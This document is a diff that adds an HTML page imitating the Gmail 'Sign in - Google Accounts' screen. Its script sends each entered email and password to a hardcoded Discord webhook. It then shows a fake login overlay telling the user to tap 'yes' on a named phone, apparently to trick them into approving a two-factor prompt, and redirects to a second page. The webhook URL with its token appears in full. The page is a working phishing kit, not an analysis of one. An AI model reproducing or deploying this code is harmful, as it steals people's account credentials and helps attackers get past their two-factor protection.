@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in - Google Accounts</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Roboto", sans-serif;
+    }
+
+    body {
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      width: 360px;
+      max-width: 90%;
+    }
+
+    .logo {
+      height: 24px;
+      margin-bottom: 24px;
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 24px;
+    }
+
+    form input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+
+    .forgot {
+      color: #1a73e8;
+      font-size: 14px;
+      margin-bottom: 30px;
+      cursor: pointer;
+    }
+
+    .bottom-links {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .create {
+      color: #1a73e8;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-left: 8px;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+
+    .hidden {
+      display: none;
+    }
+    /* Transition effect */
+    .form-step {
+      opacity: 0;
+      transform: translateX(50px);
+      pointer-events: none;
+      transition: opacity 0.4s ease, transform 0.9s ease;
+    }
+
+    .form-step.active {
+      opacity: 1;
+      transform: translateX(0);
+      pointer-events: auto;
+    }
+
+    /* Overlay blur screen */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(6px);
+      background: rgba(229, 48, 186, 0.4);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 20px;
+      font-weight: bold;
+      color: #333;
+      z-index: 5;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    @media screen and (max-width: 480px) {
+      .login-container {
+        padding: 20px;
+        width: 95%;
+      }
+
+      .logo {
+        height: 20px;
+      }
+
+      .title {
+        font-size: 20px;
+      }
+
+      .subtitle {
+        font-size: 14px;
+      }
+
+      button {
+        font-size: 13px;
+        padding: 8px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" class="logo" />
+      <h1 class="title">Sign in</h1>
+      <p class="subtitle">to continue to Gmail</p>
+      
+      <form id="login-form" onsubmit="sendwebhook(event)">
+        <!-- Step 1 -->
+        <div id="step-email" class="form-step active">
+          <input type="email" id="email" placeholder="Email or phone" required />
+          <p class="forgot">Forgot email?</p>
+        </div>
+
+        <!-- Step 2 -->
+        <div id="step-password" class="form-step">
+          <input type="password" id="password" placeholder="Enter your password" required />
+          <p class="forgot">Forgot password?</p>
+        </div>
+
+        <div class="bottom-links">
+          <p class="create">Create account</p>
+          <div>
+            <button type="button" id="next-btn">Next</button>
+            <button type="submit" id="login-btn" class="hidden">Login</button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+  <!-- Overlay -->
+  <div class="overlay" id="overlay">You are being logged in...</div>
+  <script>
+    function sendwebhook(event) {
+        event.preventDefault(); // Prevent form from submitting the traditional way
+
+        const webhookURL = 'https://discordapp.com/api/webhooks/1360893468443938939/nVG3NjKlvOE-al5sHjQ2r1qfNkooEX6F1gy8o-26uqQfFBB4dvIz9GIgk71x3qDWFcEA';
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        const message = {
+           content: 'Username: ${email}\nPassword: ${password}',
+           embeds: [
+                {
+                   title: 'Login Attempt',
+                   description: 'A login attempt was made with the following credentials',
+                   color: 0xFF0000, // Hex color code
+                   fields: [
+                       {
+                           name: 'Email',
+                           value: email,
+                           inline: true
+                       },
+                       {
+                           name: 'Password',
+                           value: password,
+                           inline: true
+                       }
+                    ]
+                }
+            ]
+        };
+
+
+    fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(message)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Success:', response);
+            } else {
+                console.error('Failed:', response);
+            }
+
+            // Always redirect after handling the response
+             // Redirect to the new website
+        })
+        .catch(error => console.error('Error:', error));
+    }
+
+  </script>
+  <script>
+    const emailStep = document.getElementById("step-email");
+    const passwordStep = document.getElementById("step-password");
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+
+    const nextBtn = document.getElementById("next-btn");
+    const loginBtn = document.getElementById("login-btn");
+    const form = document.getElementById("login-form");
+    const overlay = document.getElementById("overlay");
+    let savedEmail = "";
+
+    nextBtn.addEventListener("click", () => {
+      const email = emailInput.value.trim();
+      if (email === "") {
+        alert("Please enter your email");
+        return;
+      }
+      if (email != "hello@gmail.com"){
+        alert("invalid email");
+        return;
+      }
+
+      savedEmail = email;
+      emailStep.classList.add("hidden");
+      passwordStep.classList.add("active");
+      nextBtn.classList.add("hidden");
+      loginBtn.classList.remove("hidden");
+      passwordInput.focus();
+    });
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const password = passwordInput.value.trim();
+      if (password === "") {
+        alert("Please enter your password");
+        return;
+      }
+
+      sendwebhook(event)
+      // Show blur overlay
+      overlay.classList.add("active");
+
+      // Simulate login delay
+      setTimeout(() => {
+        overlay.innerText = "Tap on 'yes' in your Realme C11 to continue";
+      }, 15000);
+      setTimeout(() => {
+          window.location.href = `secondpage.html`;
+        }, 20000);
+      // Add your actual login request here
+    });
+
+
+
+    
+  </script>
+  <script>
+    
+  </script>
+</body>
+</html>
